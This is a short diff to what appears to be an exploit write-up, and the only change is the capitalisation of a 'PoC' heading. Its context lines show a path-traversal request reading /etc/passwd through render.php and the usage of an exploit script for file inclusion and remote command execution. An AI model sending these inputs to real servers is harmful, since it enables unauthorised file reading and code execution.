@@ -77,5 +77,5 @@ GET /api/render.php?page=../../../../etc/passwd
 python3 exp.py lfi /etc/passwd
 python3 exp.py rce "id"
 ```
-### POC
+### PoC
 <img width="1048" height="541" alt="example" src="https://github.com/user-attachments/assets/4f245f97-70dd-45e8-b0c6-c7b81b2db2e7" />
